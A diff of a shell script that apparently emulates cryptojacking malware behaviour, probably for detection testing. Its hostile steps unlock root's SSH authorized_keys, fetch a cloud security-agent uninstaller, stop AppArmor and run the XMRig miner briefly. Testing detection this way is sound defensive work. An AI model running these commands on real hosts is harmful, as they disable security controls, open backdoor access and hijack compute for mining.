@@ -126,8 +126,7 @@ chattr -iae /root/.ssh/authorized_keys
 echo Download Aliyun Agent Uninstaller
 curl http://update.aegis.aliyun.com/download/uninstall.sh
 
-echo Running Stratum Protocol via XMRIG
-timeout 20 /tmp/bins/xmrig
+
 
 echo Search for Monero Docker images
 docker images -a | grep "auto"
@@ -146,5 +145,8 @@ service apparmor stop
 echo Disable NMI watchdog
 echo '0' >/proc/sys/kernel/nmi_watchdog
 echo '1' >/proc/sys/kernel/nmi_watchdog
+
+echo Running Stratum Protocol via XMRIG
+timeout 20 /tmp/bins/xmrig
 
 echo `date` - Finished
